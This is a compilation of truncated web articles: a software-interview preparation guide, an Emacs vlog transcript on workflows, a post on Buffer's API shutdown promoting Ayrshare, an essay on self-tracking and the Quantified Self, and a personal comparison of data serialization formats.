<p>This guide is targeted at those who already have engineering experience, or perhaps are just going through their first round of interviews, but not those still learning computer science - for that there are plenty of other <a href="https://twitter.com/RandallKanna/status/1285630730610053123?s=20">great sources</a>. Otherwise, I'm assuming that you've decided to look around for an opportunity and want to do it in the most effective way possible. I hope this guide is as tactical as possible, so I'll keep things brief and actionable.</p>

<p>In the ideal case (and I'm not quite there either, but want to be more deliberate about it) you'll naturally have made friends and acquaintances throughout the industry that will think of you when they need to hire someone. A lot of times, these sorts of referrals will bypass parts or all of the standard interview process. Even if this is the case, unless you have a really good sense of the job market and the offer ranges for your experience level, <strong>I still recommend doing a couple of other interviews before taking such an offer</strong> so you can be confident it's competitive.</p>
<p>Most people, especially starting out, will have to seek out their own opportunities and that's fine! <strong>Define a criteria</strong> for yourself of things that interest you, locations you'd be willing to relocate to (remote?), and values you care about in a company. Don't necessarily restrict yourself to these for applying since you want to <strong>cast your net as wide as possible in the beginning</strong>, but keep your criteria in mind as you get closer to making your decision. Be sure to apply to companies that you know give out very high offers, even if you're not thrilled about working there because you may be able to use their offers as leverage.</p>
<p>It might be helpful to create an <code>Inteview Tracker</code>. I used a <a href="https://www.notion.so/vimota/adc4e53c94ea4f7a92e7af271d9d6d94?v=830efb1379904a6bad53cbf6d7e453a5">Notion Kanban board</a> to keep track of the different stages I was in for each company.
<img src="https://i.imgur.com/rqz9t7M.png"></p>
<p>Once you've applied to all the companies on your list, try to reach out to people in those companies to get 1) information about the interview process and the company culture and 2) potentially fast tracked through it. If you know someone at one of these companies, reach out to them! Even if you don't, pass around a list of companies you're interested in to people you know working in tech, there's a good chance they know someone who does. Cold reach outs work too, Jake does a great job of covering how to do this in his post <a href="https://justjake.substack.com/p/a-hackers-guide-to-job-hunting">A Hacker's Guide to Job Hunting</a>, I can't recommend this approach enough. Twitter is another great place to cold reach out to people at companies you're especially interested in. Most companies will have a modified process for referrals, and there's lots you can learn about a company's internal process for evaluating candidates that will help your chances, so this step can really help.</p>

<p>The best way to get great offers is to do well on the interviews. Your performance on the interviews is more than just pass/fail. Going above expectations on them gives you and the recruiter ammunition to push on the higher end of their allowed band, so try to really invest in practicing deliberately.</p>
<p>The format of the interview should be pretty familiar to you, 90% of companies follow something like this: Phone screen (coding question) -&gt; Onsite (2-3 coding questions, 1 system design, 1 project review). Sometimes they'll have a do-on-your-own-time project based interview instead, with a shorter 1-2 hour onsite. Lots has been written on how to practice for these already so I'll just link to some of the <a href="https://twitter.com/RandallKanna/status/1285630729850953729">best resources</a> and describe my general approach. 4-6 weeks of a couple of hours after work and on weekends should be more than enough time to prepare for the phone screens and onsites.</p>
<p>If you're intimidated by the open endedness of practicing for coding questions, I recommend starting by following a guide like <a href="https://yangshun.github.io/tech-interview-handbook/best-practice-questions/">this one</a>. You don't need to do every question for every week, and the dynamic programming week could be just skimmed through (in practice these are rarely asked), but it serves as a good path to make sure you cover most types of questions and continue making progress. On top of that it's useful to spend a couple sessions on:</p>
<ul>
<li><strong>algorithms and data structures</strong>; their trade offs and use cases and time complexity. <a href="https://www.interviewcake.com/data-structures-reference">These</a> are good <a href="https://github.com/kdn251/interviews">starting points</a>.</li>
<li><strong>object oriented programming and patterns</strong></li>
<li><strong>locks, parallelism and multi-threading</strong>. It's rare to get these in coding questions, but you should have some sense of what they are and how they're used. They sometimes come up when discussing follow ups to questions or in system design interviews. I mostly just reviewed the concepts with <a href="https://www.justsoftwaresolutions.co.uk/threading/locks-mutexes-semaphores.html">this</a> post, and made sure I knew how it was done in my programming language of choice, Python.</li>
<li>quirks about your <strong>programming language</strong> of choice. This probably isn't a deal breaker, but being able to drop some niche knowledge about the programming language you're using when it comes up in an interview makes you look like you really know your stuff. For example, I make sure to mention Python's Global Interpreter Lock (GIL) when talking about parallelism. <a href="https://www.notion.so/vimota/Python-Notes-7caf363f246f40ef9095e4ee13d6bcc0">Here</a> are some notes about things particular to Python I took along my practice. This is part of the reason I choose to interview with Python, it tends to have fewer things that "experts" are expected to know (compared to say, Java, where there are a million best practices), ie. fewer gotchas.</li>
</ul>
<p>The system design questions are a whole other beast, and deserve their own practice. You may not encounter them depending on the type of role you're interviewing for, but they're common for <code>full stack</code> and <code>backend</code>. They can be intimidating at first because they tend to be so open ended and have no "right answer", but once you've gone over a few examples you'll get familiar with the template you use to answer them.</p>
<ul>
<li>Go through <a href="https://github.com/donnemartin/system-design-primer">a primer</a>, taking notes on the different components that are used. Take note of the different failure modes that each part of the system can have and solutions to them (ie. retries, redundancy, timeouts, throttling, etc).</li>
<li>Impress the interviewer by naming actual services that represent each of the abstract components you're using (ie. Load balancer -&gt; NGINX, HAProxy, ELB ; cache -&gt; redis, memcache) and mention the differences between them or whether you've ever used them. This shows you have real world experience.</li>
<li>Practice answering some! Read through some <a href="https://www.educative.io/courses/grokking-the-system-design-interview/m2yDVZnQ8lG">examples</a> to learn how to structure you answers. Youtube is a solid resource for this.</li>
<li>Consistent hashing, concurrency models, partitioning, and caching are all important topics to understand.</li>
</ul>
<p>The bulk of questions you get will be covered by these, but there's a long tail of styles of questions you could also get: refactoring, debugging an open source project, designing an API, extending an existing class. It doesn't make sense to optimize for these, but know that they exist and try to get some "real world" practice as well beyond just Leetcode questions.</p>

<p>Timing matters. Try to schedule your interviews in a way that increases the chances you'll do well on the …</p></div></article></div>

			<p>In this video blog I talk about the persistent question of “the killer
app” that gets asked in the Emacs community.  I explain why I think the
identification of a single package is often not enough to appreciate the
true value proposition of Emacs.  My case emphasises the importance of
workflows; workflows that typically combine lots of distinct tools and
benefit from core Emacs attributes.  It is the whole system that
matters, because all those packages—in their given combinations—make
up our day-to-day computing experience with Emacs.</p>

<p>The text of the presentation is written in <code>org-mode</code> notation and is
reproduced below.  Also check my Emacs configuration file, from where
you can get the code I use: <a href="https://protesilaos.com/dotemacs">https://protesilaos.com/dotemacs</a>.</p>

<hr>

<pre><code>#+TITLE: Vlog: Emacs is my “favourite Emacs package”
#+AUTHOR: Protesilaos Stavrou · protesilaos.com

* Getting into the Emacs mindset

I will to talk to you about my approach to a recurring topic in the
Emacs community, best encapsulated in this question:

/What is your favourite package?/

Similar formulations:

+ What is the one thing that makes Emacs indispensable to you?
+ Which is Emacs' killer app?

Such questions can lead us to valuable findings.  There is truth to be
had in the insights drawn from them and we must learn as much as we can
in the process.

Note though that this type of inquiry expects from us to engage in an
analytical exercise that extracts an object from its milieu.  It puts us
in a frame of mind that can miss the true value proposition of Emacs.

The problématique comes with the latent risk of holding us captive to a
frame of mind characterised by *decontextualisation*, of examining an
object without reference to the environment that renders it possible.

Instead of thinking about workflows that can take you from one context
to another, we are expected to identify some silo of functionalities.
Are we then underestimating everything else that contributes to our
day-to-day /experience/ with Emacs?

* Don't ignore the forest while looking at the tree

Now before I get misunderstood: yes, Org and Magit are great; yes, there
are lots of individual packages that make your life easier; and yes,
there is value in finding which package[s] people enjoy the most.

What about the combination of all utilities?  What about the *gestalt*?

If you claim that “my favourite package is X” and then fail to couch
your statement in terms of the rest of the toolkit you rely on, you are
likely to underappreciate---or altogether ignore---the true value
proposition of Emacs.

You do not acknowledge how the whole system is pieced together.  More
importantly, you may not realise the potential of Emacs' extensibility,
which is dynamic or case-dependent.

In other words, Emacs provides the means to implement a metaphor like
that of the vaunted Unix pipes across its entire space.  In practical
terms, you can connect your email client to your agenda, your RSS reader
to your custom note-taking system, your music manager to your directory
editor, and so on.  And all these can benefit from interfaces for
searching, editing in bulk, etc.

My claim here is that most of the times there is no one package or
narrow subset that make Emacs great.  It rather is the linkages between
several pieces of code that make Emacs a pleasure to work with.  They
contribute to predictable-yet-flexible workflows.  These keep Emacs
relevant and, dare I say, intriguing.

* The three core attributes of Emacs

Emacs is programmable and introspectable.  Both presuppose transparency.
These make the Emacs experience open-ended.

+ Programmable :: One set of features can be made to interface with
  another, even though it was not conceived with the express purpose of
  optimising for that particular scenario.  What can be done with Emacs
  is not predetermined.  There is always scope for something new.

+ Introspectable :: The user can examine the entire code base or a
  specific implementation and, potentially, figure out how to connect to
  it through some other tool.  This is further supported by the robust
  self-documentation facilities of Emacs, as well as the high quality of
  material that is readily available through the built-in Info reader.
  Introspection has contributed to the /documentation culture/ that
  characterises the Emacs community at-large.

+ Transparent :: Emacs does not conceal its internals.  Virtually every
  case can be handled using the same language the code is written in
  (Emacs Lisp) while benefiting from live evaluation of new code.  You
  change something and you see it in action.  Combined with the
  self-documenting nature of Emacs, transparency provides insight into
  practically every single construct that makes up Elisp.  Which
  empowers us to make best use of Emacs' programmability.

When considered together, these engender the *interconnectedness* that
defines the Emacs space.
* Introspection in action

Quick demo of running =C-h o= (=describe-symbol=) over =mapcar= and =mapconcat=
and then testing those expressions.

#+begin_src emacs-lisp
(mapcar #'upcase '("one" "two" "three"))

(mapconcat #'upcase '("one" "two" "three") "-")
#+end_src

We can use =C-x C-e= (=eval-last-sexp=) to get live feedback of what each
function does.

We can check the log with =C-h e= (=view-echo-area-messages=).

These are the rudimentary tools you rely on to start using ELisp.  They
offer you the means to experiment with how to extend Emacs.
* A quick look at combining tools

Now let me switch to another window layout, where I have some plain text
files in a standard directory.  Nothing fancy here.  Just to show how
standard Emacs tools can combine together to deliver a consistent
computing experience.

+ Switching to another layout involves the built-in tabs (=tab-bar-mode=)
  plus some bespoke code of mine.
+ Find file at point using a filename or just part of a file (=C-x C-f M-n=).
+ Use a completion framework (=icomplete-mode= in my case).
+ Benefit from a pattern-matching style (=orderless= for me).
+ Jump to the directory that contains the file (=dired-jump=).
+ While in Dired, jump to an item using completion (=dired-goto-file=).
+ Or filter the Dired list and then find the item (=% m= potentially
  followed by =t k=).

* Interconnectedness in the Emacs space

My point is to highlight the true value of Emacs' extensibility.  Which
is realised in the connections you make between several pieces of
functionality.

And, as I already mentioned, one package does not need to know about the
presence of another /in advance/.

Your focus should be on the workflow.  On the whole system that helps
you get things done with Emacs.  Because that is what your actual
experience is about.  You benefit from the set of /emergent qualities/
that become available in the combination of otherwise disparate pieces
of functionality.

Let me stress the importance of interconnectedness in the Emacs space by
showing you another quick demo that combines three distinct packages
that were not developed for the express purpose of being combined
together:

+ =elfeed= for reading RSS/Atom feeds.
+ =bongo= for managing media files or links.
+ And my own experimental note-taking system (=usls=).

Finally, this entire presentation is made possible by combining several
tools:

+ =org-mode=
+ =olivetti-mode=
+ =org-tree-slide-mode=
+ =variable-pitch-mode=
+ my own commands for setting fonts

<h2>Buffer’s API is no more.</h2>



<p>I was an avid user of Buffer. For several companies I worked at or founded, I used Buffer to manually schedule my social media posts. Every day I would start my morning with researching post content material, writing a few posts, and scheduling these post to go out later in the day. </p>



<p>However, I quickly slowed down with creating these manual posts; I became distracted with other priorities as my company grew, or it was just laziness to think of new posts every day. Regardless, my social media engagement decreased as I posted less, which sucked.</p>



<figure><blockquote><p>Social media is an extension of your company identity in a way that is personal to your community.</p></blockquote></figure>



<p>Every founder and consumer-facing business leader knows how important social media is to growing a brand. Social media is an extension of your company identity in a way that is personal to your community. In a way that no other medium allows, my social media accounts allows me to connect to users in a real or perceived dialogue that is so essential for brand and reputation building.</p>



<p>As with most things in life, if it’s worth doing, it takes real effort.</p>



<p>Then I read an article, which I’m still hunting for, that was a slap your head “of course” moment: <strong>you can automate your organic social media</strong>. Instead of having to manually post every day I could take my existing content and post from my server-side, automating the entire process. I had tons of great data that could be automatically posted. All I needed was an API I could send my post through.</p>



<p>I went back to Buffer to use their API and bam!</p>



<figure><img loading="lazy" width="1024" height="284" src="https://ayrshare.positorgroup.com/wp-content/uploads/2020/10/Buffer-API-1024x284.jpg" alt="" srcset="https://www.ayrshare.com/wp-content/uploads/2020/10/Buffer-API-1024x284.jpg 1024w, https://www.ayrshare.com/wp-content/uploads/2020/10/Buffer-API-300x83.jpg 300w, https://www.ayrshare.com/wp-content/uploads/2020/10/Buffer-API-768x213.jpg 768w, https://www.ayrshare.com/wp-content/uploads/2020/10/Buffer-API.jpg 1394w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>The Message: Go Away</figcaption></figure>



<p>WTF!</p>



<p>In <a href="https://techcrunch.com/2012/08/01/social-media-manager-buffer-opens-api-to-developers-looks-to-become-widespread-sharing-standard/">7 short years</a>, or maybe long years in tech, <a href="https://www.buffer.com/">Buffer</a> went from offering and API to getting rid of it.</p>



<p>So what happened?</p>



<p>Based on the <a href="https://blog.loomly.com/buffer-integration-sunset/">email</a> Loomly got from Buffer, it at first looks like Buffer got in trouble with the social networks:</p>



<blockquote><p>We’ve determined that we can no longer permit certain usage of the Buffer API, especially when the posting goes beyond the stated agreements we have with the social networks.</p></blockquote>



<p>Ok, but simple abuse of posting happens whether manual or automatic. And you can build in safeguards, thresholds, and other protection mechanisms. </p>



<p>And then we come to:</p>



<blockquote><p>After an audit of existing API integrations, we’ve chosen to revoke access to third-party tools that&nbsp;provide similar functionality to Buffer’s core product, i.e. scheduling social media posts directly via&nbsp;social network&nbsp;APIs. These products can no longer utilize&nbsp;the Buffer&nbsp;API.</p></blockquote>



<p>Ah ha! Companies that essentially used Buffer as a proxy to post were no longer wanted as Buffer seemed to narrow its focus to media agencies. In this context, such a strategy to de-emphasize the API makes sense. After all, most agencies have teams of people creating content and manually scheduling and posting all day long.</p>



<p>It is a shame that Buffer dropped their API since there is a <a href="https://ayrshare.positorgroup.com/top-10-social-media-apis-for-developers/">shortage</a> of good solutions out there and it really is needed if you want to automated your social media. </p>



<p>This is the reason we created <a href="https://ayrshare.positorgroup.com/">Ayrshare</a>. We built it first for ourselves and then for users to automate posting to social media networks via an API. </p>



<p>So in a way, thanks Buffer!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><pre><span>🧠 The art, science and technology of understanding oneself. </span></pre><p><span>⏳Reading time: </span><strong><span>10 minutes</span></strong></p><p><em>"Hey Siri, am I a cyborg yet?"</em></p><p>You are a system. Well, a biological one, but a system nonetheless. An interconnected bunch of elements forming a complex whole. And as with many systems, it is subject to be analysed or even optimised. By studying it you gradually<span> develop a more complete picture of your mind and body. But the form in which we gather and interpret this information is changing. We now have access to tools and services that were unimaginable decades ago. And there's </span><em>a lot of data</em><span> that comes with it. Instead of getting analysis every few months from the doctor, we can now get it by the minute. Many people don't think about it twice, but others have begun to ask </span><strong>the question</strong><span>:</span></p><p><em>"How can I use my personal data to learn more about myself?"</em></p><p>Stephen Wolfram <em>(Wolfram Alpha / Mathematica CEO) </em>is one of these people. Back in 2012, Stephen published an essay titled <a href="https://writings.stephenwolfram.com/2012/03/the-personal-analytics-of-my-life/">"The Personal Analytics of My Life"</a>, exploring the vast amounts of data he collected about himself from the early 1990's to the early 2010's. Emails, phone calls, footsteps, keystrokes. <i>Yes, keystrokes. </i>Using this data, Stephen asks questions like "how many hours have I spent on the phone each day", or "how has my vocabulary evolved over the years", and analyses it using statistics and visualisation software. He hasn't stopped collecting data since then. In fact, he <em>regrets not starting sooner</em>, and not having more types of data to work with. Being a productivity guru, these insights help Stephen become more productive and do better work, especially since he runs a remote business and is involved in pretty much every aspect of the company. Surprised by the fact that nobody seemed as interested as he was in tracking this data, Stephen hoped that one day this will become the norm:&nbsp;</p><blockquote><p>One day everyone will routinely collect all sorts of data about themselves.</p></blockquote><p>Stephen had coined the term "Personal Analytics" - the use of <strong>self-tracking </strong>methods or <strong>self-monitoring </strong>devices to analyse one's own behaviour and physiological responses. He knew how to extract this data from various sources (via scripts, custom software and integrations) and process it using statistical tools (which he built) - technical know-how that many people don't have. In his words:&nbsp;</p><blockquote><p>My fundamental thing about personal analytics is, I don’t put any effort into collecting the data. I put effort into getting <em>systems</em> built to do it, and then I make sure the systems keep running.</p></blockquote><p>Building this kind of personal data infrastructure is not an easy task, and certainly not within reach of most people. But it is getting easier. For starters, a lot of this data is already collected for you - thanks to big tech corporations, love them or hate them. And the <em>systems </em>that Stephen was talking about - many are already in place. From your location history on Google to your sleep activity on Fitbit, it's all there. Today, the privilege of self-tracking is no longer reserved for the tech savvy data hoarders. As we go into the 2020's, we realise the vast amount of data that we've produced over the years, <em>especially the digital natives</em> - those who were born after 1980 and grew up immersed in gadgets. We've been scattering digital footprints across the devices we use, and generated tonnes of data, knowingly or not. Facebook has been around long enough that some people now have <em>14 years of data </em>on the platform. Others may have <em>30 years of emails</em>. This realisation may hit some people and lead them to ask that very question - <em>"what can I learn from all this?".&nbsp;</em></p><h2>The science of self-knowledge</h2><p>To understand the nature of self-tracking and personal analytics, first let's take a look at how we interpret ourselves in scientific terms:&nbsp;</p><p><strong><em>Introspection</em></strong></p><p>The philosophical term for being able to 'look inward'. The mental events of judging, deciding, reasoning, experiencing, imagining, and feeling are attributed to introspection.&nbsp;</p><p><em><strong>Observation</strong></em></p><p>Information about our internal condition that we receive and infer from our senses. It's a type of knowledge that we can easily measure and explain in rational terms. For example: looking at yourself in the mirror, or 'tuning in' to your bodily signals like hunger or heartbeat.&nbsp;</p><p>The validity and reliability of introspection is questioned amongst philosophers and cognitive scientists. Once seen as a reliable source of inner truth by philosophers, today the method has a number of limitations and criticisms. The very concept of being able to 'look into oneself' is fuzzy. We cannot introspect or control our own mental processes, especially when it comes to unconscious forms of bias, or explanations of our own reasoning. But we're aware of our unawareness. It is therefore normal to seek out complementary forms of knowledge about yourself. Those that are based on evidence - <em>facts, events and numbers</em>.&nbsp;</p><h2>The rise of self-tracking</h2><p>The particular motivation for self-tracking really depends on the person and their circumstances, but generally it's a matter of reflecting and acting upon one's life, in an effort to live healthier, better, and longer. <em>Fitter, happier, more productive</em><strong>. </strong>For instance, someone in their 20's might be looking for ways to minimise burnout and stress. Older folks may be concerned with their diet or cholesterol levels. Others may want to improve their sleep. Or keep track of every time they sneeze. Whatever the reason, people are digging into their digital data doubles and tracking data that has never been quantified before. You name it - it's probably being tracked by someone, somewhere.&nbsp;</p><h2>It all started with the weight scale</h2><figure><img loading="lazy" src="https://i.pinimg.com/474x/f6/b4/a2/f6b4a2c4ce4fb514c8d0fbbf92482d1e--vintage-scales-kitchen-scales.jpg" data-is-external-image="true" alt="An American penny scale" width="130" height="502"><figcaption>An American penny scale</figcaption></figure><p>The concept of self-tracking is not new, and goes back to the late 19th century, when 'penny scales' would allow people to record their own weight for the first time without visiting the doctor's office. Before scales made their way into people home's, they were <a href="https://www.youtube.com/watch?v=F_zDhUi-JjA">out in the public</a> - in grocery stores, pharmacies and banks. Reminding everyone to stay healthy, these grandfather-clock-looking devices became the first vending machine in the U.S that provided a service, not a product. Slot a penny in, get your weight and a satisfying bell sound. It was a huge commercial success - between the 1930's and 40's penny scales brought in over 1 billion pennies ($10 million annually). The messaging surrounding the scales was clear: <strong>those who weigh themselves often - know themselves well, and those who know themselves well - live well.&nbsp;</strong></p><p>By the time the first domestic scales appeared, a person's weight became an important form of self-knowledge, and once a standard table of height and weight was established, people not only knew their weight, but also what they 'should' weigh ideally. With this industry standard the public had the ability to manage their weight and optimise towards a target. This attached a level of self-worth to a number that we still see deeply reflected in our society today. As one participant of a study confessed:&nbsp;</p><blockquote><p>I don’t feel any way until I know the number on the scale. The numbers tell me how to feel.&nbsp;</p></blockquote><h2>Quantified Self</h2><p>A community that fully embraces <em>"self-knowledge through numbers"</em> is the <a href="https://quantifiedself.com/">Quantified Self</a> (QS) movement, which has now grown to 70,000 members around the world since it's foundation in 2007. Originally starting in Silicon Valley, it now encompasses a growing community forum, worldwide meet-ups and conferences, and even a QS institute. The community members learn from each other, share <a href="https://github.com/woop/awesome-quantified-self">tools and frameworks</a>, and constantly strive to get the most out of their data. The tech savvy ones may even build their own personal data infrastructure, similar to Stephen Wolfram, by writing scripts to fetch data from their software and hardware. Others may simply write down their moods on a piece of paper, hoping it will be useful some day. And then there's the dashboard enthusiasts, building admin panels to visualise their life in every possible way.&nbsp;</p><figure><figure><img loading="lazy" src="https://existentialist.xyz/media/posts/7/your_life.png" alt="Your life" width="300" height="284"></figure><figcaption>Imagine a fancy dashboard on that laptop screen. And a notification that says 'Constitution + 1'</figcaption></figure><p>While compelling, the Quantified Self movement also begs the question - <em>why</em>? Kevin Kelly, one of the founders of the Quantified Self movement, puts it this way:</p><blockquote><p>The real goal was always personalisation - to have an experiment of n=1. <strong>…</strong>&nbsp; Most medical research is performed at a very large scale where you have thousands of thousands of participants, otherwise it's not really considered valid. But in fact - none of us really want a treatment, therapy or regime that works for everybody - we want something that works for <em>us</em>. So instead of having an <em>n</em> of thousands, we're just going to experiment on ourselves (hence n=1). And if it works for us - then that's<em> all we need.</em>&nbsp;</p></blockquote><p>It's an interesting perspective pointing towards our increasingly individualistic society. The meaning of personalisation is important to consider in context here. Sure, while Apple Watch and Fitbit provide <em>personalised</em> dashboards, they are still designed for mass data collection and analysis. True personalisation comes from one actively taking ownership in the data, from collection to analysis and ultimately decision-making, in a way that works for them. This is the promise of Quantified Self. Although it's still far from the data-driven personal utopia, it hints at a society that's more self-aware than ever before. One where technology gives us a more complete picture of ourselves, and where our behaviour is partially rooted in the insights we get from our own data.&nbsp;</p><p>Of course, it would be delusional to assume that technology will give us all the answers. <em><strong>A</strong></em> <em><strong>truly quantified self&nbsp;is unthinkable&nbsp;</strong></em>by current standards, since there's so much of what makes us human that can't be quantified, or even rationally explained. This makes me wonder about the implications of the QS movement. Those that get spiralled down the rabbit hole of self-tracking for no apparent reason other than "this data might be useful someday" gives us a glimpse of the possible future. Although …</p></div></div>

<br/>
October 23, 2020 | https://wiki.alopex.li/BetterThanJson | <a href="https://web.archive.org/web/*/https://wiki.alopex.li/BetterThanJson">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wikipage">

<p>I want to take a brief look at various data serialization formats and compare them. Basically the goal is to answer the question, “can we find something better than JSON?” However, note that we are looking at these things for DATA SERIALIZATION, not for config files and stuff, so that’s the goal by which these will be judged.</p>
<p>There’s two orthogonal axes to look at these things under:</p>
<ul>
<li>Self-describing vs.&nbsp;schema-defined formats</li>
<li>Human readable vs.&nbsp;machine-readable formats</li>
</ul>
<p>That is, whether the type information for a structure is defined in a separate file (a schema) that a receiving program checks against, or whether the message itself contains type information. It’s almost exactly the difference between statically and dynamically typed programming languages. Like programming languages, both have pros and cons, neither of them are always better than the other. The goal of this is to compare apples to apples, so we’re gonna note which category these things fall into but not make value judgements based on them. There’s also fuzzy edges; many self-describing formats optionally have a schema layer too. Similarly, we will not really compare tooling quality; the goal is to look at the intrinsic properties of the formats. The culture surrounding them may be considered though.</p>
<p>This is also important not to conflate with an RPC protocol, though many of these things are used IN RPC protocols. Keep in mind that HTTP/REST interfaces are often just a type of RPC protocol, whether realized that way or not.</p>
<p>Up to date as of October 2020. Doesn’t try to include myriad minor things, ’cause there’s only so much time in the world.</p>

<h2 id="json">JSON</h2>
<p><a href="http://json.org/">http://json.org/</a></p>
<p>What everything gets currently compared against. We all know JSON, we all agree it’s Sorta Good Enough but really is kinda crap.</p>
<p><strong>Category:</strong> Human-readable, self-describing. (<a href="https://json-schema.org/">https://json-schema.org/</a> exists but does not seem very widely used.) Has an <a href="https://en.wikipedia.org/wiki/JSON-RPC">RPC protocol</a> but it also seems lightly used, <a href="https://jsonapi.org/">this</a> might be more general.</p>
<p><strong>Users:</strong> Everyone</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Similar to major programming languages – Easy to understand and debug</li>
<li>Simple – Easy to read, write, and understand… at least for simple things. <a href="http://seriot.ch/parsing_json.php">Turns out there’s a lot of gotcha’s though.</a></li>
<li>Pretty compact if minified</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Type system is pretty shit – no date/time, no real integers, no real structs, no unions/tuples/etc</li>
<li>Tends to discourage schema’s – “So simple it doesn’t need it”, until it becomes less simple.</li>
<li>No normalized form – fields may be reordered, <em>duplicated</em>, etc. Makes hashing it hard, gotta read whole message to begin verifying it, etc.</li>
<li>No comments – harder to write well than you might think!</li>
<li>No good way to contain binary data</li>
</ul>
<h2 id="yaml">YAML</h2>
<p><a href="https://yaml.org/">https://yaml.org/</a></p>
<p>Started out as a simpler alternative to XML.</p>
<p><strong>Category:</strong> Human-readable, self-describing.</p>
<p><strong>Users:</strong> Lots of people</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Vaguely simple to read and write, in its basic form</li>
<li>Low visual noise</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Way too complicated – they made it a strict superset of JSON for some damn reason, and nobody uses that form, so it’s just a pile of wasted effort</li>
<li>Reference impl incomplete, other impl’s disagree with each other and the spec</li>
</ul>
<h2 id="xml">XML</h2>
<p><a href="https://en.wikipedia.org/wiki/XML">https://en.wikipedia.org/wiki/XML</a></p>
<p>Not sure anyone really knows how XML happened. It’s basically the W3C’s fault, I think? It’s okay for some things but in the end I’m not sure it’s something anyone actually <em>wants</em> to use, it’s just going to be one more of those mistakes of the past.</p>
<p><strong>Category:</strong> Human-readable, self-describing with common schema usage. Has an <a href="https://en.wikipedia.org/wiki/XML-RPC">RPC protocol</a> and many other complicated things.</p>
<p><strong>Users:</strong> Everyone who can’t avoid it.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Promotes schemas and validation</li>
<li>Simple to use for simple things</li>
<li>Actually pretty decent for documents</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>I’ve never gotten schemas and validation to actually work in practice</li>
<li>Everything is string-ly typed</li>
<li>No real arrays</li>
<li>Complicated as frig</li>
<li>Very verbose</li>
<li>There’s like 3-4 different ways to do everything</li>
<li>Still no good way to contain binary data</li>
</ul>

<h2 id="protobuf">Protobuf</h2>
<p><a href="https://developers.google.com/protocol-buffers/">https://developers.google.com/protocol-buffers/</a></p>
<p>aka Protocol Buffers, but that’s a pretty dumb name. Google’s common, fast on-the-wire serialization format.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Has an <a href="https://grpc.io/">RPC protocol</a> built around it.</p>
<p><strong>Users:</strong> Google, basically everyone</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Backed by Google, so it’s going to be good at the things Google values</li>
<li>Basically reasonable</li>
<li>Now has some support for versioning schemas, though it’s a hard problem in general</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Backed by Google, so it’s going to be good at the things Google values</li>
<li>Not particularly simple</li>
<li>Wire protocol may be more work than it needs to be</li>
<li>Its type system <a href="http://reasonablypolymorphic.com/blog/protos-are-wrong/index.html">could maybe be better</a></li>
</ul>
<h2 id="capn-proto">Cap’n Proto</h2>
<p><a href="https://capnproto.org/">https://capnproto.org/</a></p>
<p>The Other Binary Serialization Protocol.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Designed primarily for RPC, which is built in to the reference implementation.</p>
<p><strong>Users:</strong> sandstorm.io, Cloudflare?, various other people but it doesn’t seem like that many</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Designed to be fast</li>
<li>Made by one of the people who worked heavily on Protobuf at Google, so <a href="https://capnproto.org/faq.html#how-do-i-make-a-field-required-like-in-protocol-buffers">there’s lots of experience behind it</a>. That said, doesn’t mean this cat’s always <em>right</em>, but there’s certainly opinions that are trying to be expressed.</li>
<li>Sophisticated RPC comes as part of the standard package</li>
<li>Designed for zero-copy deserialization</li>
<li>Designed for schema to evolve</li>
<li>Adorable name</li>
<li>Very explicit about correctness and conformance things such as field ordering and layout</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Very explicit about correctness and conformance things such as field ordering and layout</li>
<li>Lots of the docs and concepts are pretty low level, you usually ain’t gonna need it</li>
<li>Seems more complicated than protobuf – this might be one reason there’s fewer 3rd-party implementations</li>
</ul>
<h2 id="thrift">Thrift</h2>
<p><a href="https://thrift.apache.org/">https://thrift.apache.org/</a></p>
<p>Apache’s version of Protobuf. Does anyone actually use this? Facebook, apparently, since they invented it and then gave it to Apache. Anyone else?</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Designed primarily for RPC.</p>
<p><strong>Users:</strong> Basically mostly Facebook? Twitter and AirBNB also apparently use it, so apparently it’s not UNpopular.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>It works?</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Docs suck</li>
<li>Apache is the tragic junkyard of open source projects</li>
<li>Apparently still not as good as flatbuffers, see below</li>
</ul>
<h2 id="flatbuffers">Flatbuffers</h2>
<p><a href="https://google.github.io/flatbuffers/">https://google.github.io/flatbuffers/</a></p>
<p>Feels a little like Google’s answer to Cap’n Proto, as it has some of the same design goals – zero-copy serialization and layouts that are more amenable to versioning.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Includes RPC protocol.</p>
<p><strong>Users:</strong> Google, Cocos2D, Facebook’s mobile client</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Designed for zero-copy deserialization</li>
<li>Designed for schema to evolve</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Kinda feels like the problem is already solved by capnp</li>
<li>Includes a JSON parser for some reason?</li>
<li>Type system is kinda anemic with regards to unions</li>
</ul>
<h2 id="cbor">CBOR</h2>
<p><a href="https://cbor.io/">https://cbor.io/</a></p>
<p>Basically a binary re-imagining of JSON.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> ???</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Pretty good type system – there’s things like fixnum’s, datetime’s, blobs, etc</li>
<li>Compact</li>
<li>Built-in extensibility</li>
<li>Designed to be a drop-in replacement for JSON</li>
<li>IETF standard</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Kinda more complicated than it needs to be, though this is for the sake of compactness and comprehensive types. Numbers are densely packed into fewer bits when possible, for example.</li>
<li>Doesn’t actually seem that widely adopted for some reason?</li>
</ul>
<h2 id="msgpack">Msgpack</h2>
<p><a href="https://msgpack.org/">https://msgpack.org/</a></p>
